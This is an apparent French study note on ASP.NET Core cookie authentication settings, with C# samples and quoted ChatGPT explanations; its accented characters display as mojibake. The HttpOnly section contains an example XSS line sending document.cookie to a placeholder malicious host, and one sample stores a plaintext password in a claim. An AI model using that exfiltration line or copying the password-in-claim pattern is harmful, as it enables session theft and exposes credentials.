# Les options de sÃ©curitÃ© du `cookie`

```cs
builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =>
    {
        options.LoginPath = "/hukar-login";
        options.LogoutPath = "/hukar-logout";
        options.Cookie.HttpOnly = true;
        options.ExpireTimeSpan = TimeSpan.FromMinutes(30);
        options.SlidingExpiration = true;
        options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
        options.Cookie.SameSite = SameSiteMode.Strict;
        options.Cookie.Domain = "my-app.com";
    });
```

### `options.Cookie.HttpOnly`  : `bool`

`true` => EmpÃªche l'accÃ¨s au `cookie` via `Javascript`.

Lors d'une attaque `XSS` un script malveillant est injectÃ© dans le site, celui-ci ne pourra alors pas lire le `cookie` authentification.

> ChatGpt
>
> ### âœ… ** `HttpOnly` protÃ¨ge contre le vol de cookies via JavaScript**
>
> Quand un cookie est marquÃ© avec **`HttpOnly = true`**, il **ne peut pas Ãªtre accÃ©dÃ© via JavaScript** (`document.cookie`). Cela signifie que si un attaquant injecte du script malveillant sur ton site (**XSS**), il ne pourra pas rÃ©cupÃ©rer directement le cookie dâ€™authentification.
>
> #### ğŸ” **Exemple d'attaque empÃªchÃ©e par `HttpOnly`** :
>
> ```js
> // Si HttpOnly est activÃ©, cela Ã©choue :
> console.log(document.cookie); // Impossible d'accÃ©der au cookie
> ```
>
> Sans `HttpOnly`, un attaquant pourrait rÃ©cupÃ©rer le cookie et l'envoyer Ã  son serveur :
>
> ```js
> fetch("https://malicious-site.com/steal-cookie?data=" + document.cookie);
> ```



### `options.ExpireTimeSpan` : `TimeSpan`

`TimeSpan.FromMinutes(30)` => Expiration du `cookie` aprÃ¨s `30` minutes.



### `options.SlidingExpiration` : `bool`

`true` => Renouvelle l'expiration Ã  chaque requÃªte.



### `options.Cookie.SecurePolicy`

Cette option contrÃ´le si le `cookie` doit Ãªtre transmis uniquement en `HTTPS`.

> DÃ©sactivÃ©e en mode dÃ©veloppement par `asp.net`.
>
> Les navigateurs traitent `localhost` comme sÃ©curisÃ© mÃªme en `HTTP`.

| Valeur          | Description                                                  |
| --------------- | ------------------------------------------------------------ |
| `None`          | Le cookie est envoyÃ© en HTTP et HTTPS (âš ï¸ Non recommandÃ©, sauf en dÃ©veloppement). |
| `Always`        | Le cookie est envoyÃ© **uniquement en HTTPS** (âœ… RecommandÃ© en production). |
| `SameAsRequest` | Le cookie suit le protocole de la requÃªte (si la requÃªte est en HTTP, le cookie est envoyÃ© en HTTP, sinon en HTTPS). |

ğŸ‘‰ **Recommandation :** Toujours utiliser `CookieSecurePolicy.Always` en production pour Ã©viter que le cookie ne soit interceptÃ© en clair sur HTTP.



### `options.Cookie.SameSite`

La valeur par dÃ©faut est `Lax`. 

Cette option contrÃ´le si le `cookie` est envoyÃ© avec des requÃªtes provenant d'autres  sites (protection contre les attaques `CSRF`).

| Valeur   | SÃ©curitÃ©               | Explication                                                  |
| -------- | ---------------------- | ------------------------------------------------------------ |
| `Strict` | ğŸ”’ TrÃ¨s haute           | Le cookie **n'est jamais envoyÃ©** aux requÃªtes cross-site. Il n'est transmis que pour les requÃªtes initiÃ©es directement par le mÃªme site (ex: navigation manuelle, clic sur un lien interne). |
| `Lax`    | ğŸŸ  Moyenne              | Le cookie **est envoyÃ©** pour les requÃªtes de navigation (GET via un lien), mais pas pour les requÃªtes **automatiques** (POST, AJAX, iframes, etc.). |
| `None`   | âŒ RisquÃ© (sans Secure) | Le cookie est **toujours envoyÃ©**, mÃªme dans un contexte cross-site. Doit Ãªtre combinÃ© avec `SecurePolicy=Always` pour Ãªtre sÃ©curisÃ©. |

ğŸ‘‰ **Recommandation :**

- Utiliser **`Strict`** si ton application nâ€™a pas besoin dâ€™envoyer des cookies Ã  des requÃªtes externes.
- Si ton application a besoin de supporter **OAuth** ou des requÃªtes multi-sites, utilise `Lax` (c'est le comportement par dÃ©faut).
- **Ne jamais utiliser `None` sans HTTPS**, sinon ton cookie sera exposÃ©.



### `options.Cookie.Domain`

Par dÃ©faut le `Domain` n'est pas spÃ©cifiÃ©, le `cookie` est donc attachÃ© au `domaine` qui l'a dÃ©fini. Avec `Cookie.Domain` on peut rendre le `cookie` valide pour un `domaine` et ses `sous-domaines`.

> (ChatGPT rÃ©sumÃ©)
>
> ### âœ¨ Exemples :
>
> - **Sans `Cookie.Domain`** :
>
>   - Un cookie dÃ©fini sur `auth.example.com` ne sera **pas accessible sur `www.example.com`**.
>
> - **Avec `Cookie.Domain = "example.com"`** :
>
>   - Le cookie sera **accessible** pour `auth.example.com`, `www.example.com`, `app.example.com` et toute autre sous-domaine de `example.com`.
>
>   
>
> ### **ğŸ”¹ Conclusion**
>
>   - **Si ton application est monodomaine** â†’ **Ne configure pas `Cookie.Domain`**, la valeur par dÃ©faut suffit.



## Information du `navigateur`

La pluspart de ces informations sont disponibles dans le `navigateur` :

<img src="assets/davtools-browser-cookie-info-phc.png" alt="davtools-browser-cookie-info-phc" />



## DurÃ©e de la session d'authentification

```cs
var claimOne = new Claim("name", "hukar");
var claimTwo = new Claim("password", "1234");
var identity = new ClaimsIdentity([ claimOne, claimTwo ], CookieAuthenticationDefaults.AuthenticationScheme);

var user = new ClaimsPrincipal(identity);

var authProperties = new AuthenticationProperties
{
    ExpiresUtc = DateTimeOffset.UtcNow.AddMinutes(20)
};

await ctx.SignInAsync(user, authProperties);
```

> (ChatGPT)
>
> ## ğŸ“Œ **1. DiffÃ©rence entre `options.ExpireTimeSpan` et `AuthenticationProperties.ExpiresUtc`**
>
> | Option                                                       | Impact sur le cookie                                        | Impact sur lâ€™authentification                        |
> | ------------------------------------------------------------ | ----------------------------------------------------------- | ---------------------------------------------------- |
> | **`options.ExpireTimeSpan`** (durÃ©e globale)                 | DÃ©finit la durÃ©e du **ticket dâ€™authentification**           | UtilisÃ© lors de **lâ€™Ã©mission initiale du cookie**    |
> | **`AuthenticationProperties.ExpiresUtc`** (durÃ©e spÃ©cifique) | Surcharge `ExpireTimeSpan` pour une authentification donnÃ©e | Permet dâ€™avoir une durÃ©e **par utilisateur/session** |
>
> ------
>
> ## ğŸ•µï¸ **2. Pourquoi `Expires = Session` dans le navigateur ?**
>
> Si tu vois **"Session"** dans les DevTools du navigateur sous `Expires`, cela signifie que ton cookie **est un cookie de session**, donc **il sera supprimÃ© dÃ¨s que l'utilisateur ferme le navigateur**.
>
> **ğŸ‘‰ Pourquoi cela arrive ?**
>  Par dÃ©faut, le cookie **nâ€™a pas de date dâ€™expiration explicite**, car .NET ne met pas de `Expires` dans le cookie **si `IsPersistent = false`**.
>
> ### ğŸš€ **Comment rendre le cookie persistant ?**
>
> Ajoute `IsPersistent = true` dans les `AuthenticationProperties` :
>
> ```csharp
> var authProperties = new AuthenticationProperties
> {
>     IsPersistent = true, // Rend le cookie persistant (pas supprimÃ© Ã  la fermeture du navigateur)
>     ExpiresUtc = DateTimeOffset.UtcNow.AddMinutes(20) // Expiration aprÃ¨s 20 minutes
> };
> ```
>
> Maintenant, ton cookie aura bien une date dâ€™expiration visible dans le navigateur ! ğŸ¯
>
> ------
>
> ## ğŸ›  **3. Exemple complet de configuration**
>
> ```csharp
> builder.Services.ConfigureApplicationCookie(options =>
> {
>     options.ExpireTimeSpan = TimeSpan.FromMinutes(60); // DurÃ©e par dÃ©faut : 60 minutes
>     options.SlidingExpiration = true; // Renouvelle la session si l'utilisateur est actif
>     options.Cookie.HttpOnly = true;
>     options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
> });
> 
> public async Task<IActionResult> Login()
> {
>     var claims = new List<Claim>
>     {
>         new Claim(ClaimTypes.Name, "John Doe")
>     };
> 
>     var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
>     var authProperties = new AuthenticationProperties
>     {
>         IsPersistent = true, // Le cookie reste aprÃ¨s fermeture du navigateur
>         ExpiresUtc = DateTimeOffset.UtcNow.AddMinutes(20) // Expiration aprÃ¨s 20 min
>     };
> 
>     await HttpContext.SignInAsync(
>         CookieAuthenticationDefaults.AuthenticationScheme,
>         new ClaimsPrincipal(claimsIdentity),
>         authProperties
>     );
> 
>     return RedirectToAction("Index");
> }
> ```
>
> ------
>
> ## ğŸ§ **4. Que se passe-t-il si `options.ExpireTimeSpan` et `ExpiresUtc` sont diffÃ©rents ?**
>
> ğŸ‘‰ **Cas 1 : `ExpireTimeSpan = 60 min` et `ExpiresUtc = 20 min`**
>  ğŸ“Œ Le **cookie** sera valide pendant **60 minutes**, mais l'authentification expirera aprÃ¨s **20 minutes**.
>
> ğŸ‘‰ **Cas 2 : `ExpireTimeSpan = 20 min`, pas de `ExpiresUtc`**
>  ğŸ“Œ Le **cookie** expirera aprÃ¨s **20 minutes** (valeur globale).
>
> ğŸ‘‰ **Cas 3 : Pas de `ExpireTimeSpan`, mais `ExpiresUtc = 30 min`**
>  ğŸ“Œ La **durÃ©e de session** est limitÃ©e Ã  **30 minutes**, mais le cookie peut rester plus longtemps (jusqu'Ã  la fermeture du navigateur si `IsPersistent = false`).



### `IsPeristent = true`

```cs
var authProperties = new AuthenticationProperties
{
    IsPersistent = true,
    ExpiresUtc = DateTimeOffset.UtcNow.AddMinutes(20)
};

await ctx.SignInAsync(user, authProperties);
```

Dans mon navigateur `Expires` n'est plus Ã©gal Ã  `Session`  :

![session-doesn-t-expire-now-xoo](assets/session-doesn-t-expire-now-xoo.png)

> Un **cookie de session ne disparaÃ®t pas quand on ferme un onglet**, mais uniquement **quand on ferme entiÃ¨rement le navigateur**.
>
> Pour garder un cookie aprÃ¨s la fermeture du navigateur, il faut **dÃ©finir une date dâ€™expiration (`ExpiresUtc`) et activer `IsPersistent = true`**.
